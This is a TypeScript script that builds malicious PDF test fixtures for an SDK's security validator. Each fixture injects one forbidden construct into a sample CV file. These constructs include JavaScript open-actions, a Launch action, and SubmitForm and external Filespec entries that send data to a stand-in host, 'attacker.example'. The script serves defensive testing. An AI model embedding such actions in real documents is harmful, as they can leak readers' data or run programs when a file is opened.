/**
 * Builds the malicious-corpus fixtures consumed by the SDK security tests.
 *
 * Each output .cv is a minimal mutation of a valid base file: exactly one
 * forbidden construct is injected, so any SDK that fails to detect it can
 * pinpoint which rule it missed. The manifest pairs each fixture with the
 * stable error code its validator must emit.
 *
 * Run with `pnpm dlx tsx tools/build-malicious.ts` from packages/sdk-js.
 */

import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  PDFArray,
  PDFDict,
  PDFDocument,
  PDFHexString,
  PDFName,
  PDFNumber,
  PDFRef,
  PDFString,
} from 'pdf-lib';

const here = dirname(fileURLToPath(import.meta.url));
const sdkRoot = join(here, '..');
const repoRoot = join(sdkRoot, '..', '..');
const baseFixture = join(sdkRoot, 'examples', 'out', 'jane-doe.cv');
const outDir = join(repoRoot, 'spec', 'test-vectors', 'malicious');

interface Mutation {
  filename: string;
  expectedCode: string;
  description: string;
  mutate: (pdfDoc: PDFDocument) => Promise<void> | void;
}

const mutations: Mutation[] = [
  {
    filename: 'js-action.cv',
    expectedCode: 'javascript-action',
    description: 'OpenAction is an /Action dict with subtype /JavaScript carrying inline /JS.',
    mutate: (pdf) => {
      const action = pdf.context.obj({
        Type: 'Action',
        S: 'JavaScript',
        JS: PDFString.of('app.alert({cMsg: "pwned"});'),
      });
      pdf.catalog.set(PDFName.of('OpenAction'), pdf.context.register(action));
    },
  },
  {
    filename: 'launch-action.cv',
    expectedCode: 'launch-action',
    description: 'OpenAction launches an external program.',
    mutate: (pdf) => {
      const action = pdf.context.obj({
        Type: 'Action',
        S: 'Launch',
        F: PDFString.of('/usr/bin/open'),
      });
      pdf.catalog.set(PDFName.of('OpenAction'), pdf.context.register(action));
    },
  },
  {
    filename: 'import-data-action.cv',
    expectedCode: 'import-data-action',
    description: 'OpenAction imports form data from an external file.',
    mutate: (pdf) => {
      const action = pdf.context.obj({
        Type: 'Action',
        S: 'ImportData',
        F: PDFString.of('/tmp/payload.fdf'),
      });
      pdf.catalog.set(PDFName.of('OpenAction'), pdf.context.register(action));
    },
  },
  {
    filename: 'submit-form-external.cv',
    expectedCode: 'submit-form-external',
    description: 'OpenAction posts form data to a non-mailto URL.',
    mutate: (pdf) => {
      const action = pdf.context.obj({
        Type: 'Action',
        S: 'SubmitForm',
        F: PDFString.of('https://attacker.example/intake'),
      });
      pdf.catalog.set(PDFName.of('OpenAction'), pdf.context.register(action));
    },
  },
  {
    filename: 'encrypted.cv',
    expectedCode: 'encrypted-document',
    description: 'Trailer declares an /Encrypt dictionary.',
    mutate: (pdf) => {
      // We do not need a real encryption setup; the validator looks for the
      // mere presence of the trailer entry. pdf-lib still serialises the
      // pseudo-dict, which keeps the wrapper PDF readable for the security
      // scanner pass.
      const encryptDict = pdf.context.obj({
        Filter: 'Standard',
        V: PDFNumber.of(1),
        R: PDFNumber.of(2),
        Length: PDFNumber.of(40),
      });
      pdf.context.trailerInfo.Encrypt = pdf.context.register(encryptDict);
    },
  },
  {
    filename: 'external-filespec.cv',
    expectedCode: 'external-filespec',
    description: 'A /Filespec entry in /AF references an outside URL with no /EF stream.',
    mutate: (pdf) => {
      const filespec = pdf.context.obj({
        Type: 'Filespec',
        FS: 'URL',
        F: PDFString.of('https://attacker.example/leak'),
        UF: PDFHexString.fromText('https://attacker.example/leak'),
        Desc: PDFString.of('external'),
        AFRelationship: 'Supplement',
      });
      const afRef = pdf.catalog.get(PDFName.of('AF'));
      const afArray = afRef ? pdf.context.lookup(afRef, PDFArray) : pdf.context.obj([]);
      afArray.push(pdf.context.register(filespec));
      if (!afRef) pdf.catalog.set(PDFName.of('AF'), afArray);
    },
  },
  {
    filename: 'js-names-tree.cv',
    expectedCode: 'javascript-names-tree',
    description: 'Catalog /Names tree exposes a /JavaScript leaf.',
    mutate: (pdf) => {
      const action = pdf.context.obj({
        Type: 'Action',
        S: 'JavaScript',
        JS: PDFString.of('app.alert("via names");'),
      });
      const namesTree = pdf.context.obj({
        Names: [PDFString.of('boot'), pdf.context.register(action)],
      });
      const names = pdf.context.obj({
        JavaScript: pdf.context.register(namesTree),
      });
      pdf.catalog.set(PDFName.of('Names'), pdf.context.register(names));
    },
  },
];

async function main(): Promise<void> {
  const baseBytes = await readFile(baseFixture);
  await mkdir(outDir, { recursive: true });

  const manifestEntries: Array<{
    filename: string;
    expectedCode: string;
    description: string;
  }> = [];

  for (const mutation of mutations) {
    const pdfDoc = await PDFDocument.load(baseBytes, { updateMetadata: false });
    await mutation.mutate(pdfDoc);
    const bytes = await pdfDoc.save({ useObjectStreams: false });
    const outPath = join(outDir, mutation.filename);
    await writeFile(outPath, bytes);
    manifestEntries.push({
      filename: mutation.filename,
      expectedCode: mutation.expectedCode,
      description: mutation.description,
    });
    process.stdout.write(`wrote ${mutation.filename} (${bytes.length} bytes)\n`);
  }

  const manifest = {
    note: 'Each fixture is a valid .cv file with exactly one forbidden construct injected. SDK security tests assert that validate() returns ok=false and includes the listed error code.',
    fixtures: manifestEntries,
  };
  await writeFile(join(outDir, 'manifest.json'), JSON.stringify(manifest, null, 2) + '\n');
  process.stdout.write(`wrote manifest.json (${manifestEntries.length} fixtures)\n`);

  // Touch PDFRef import so build doesn't drop it (it's part of the public surface
  // we may need when extending mutations to indirect-only references).
  void PDFRef;
  void PDFDict;
}

main().catch((err) => {
  process.stderr.write(`error: ${err instanceof Error ? err.stack : String(err)}\n`);
  process.exit(1);
});
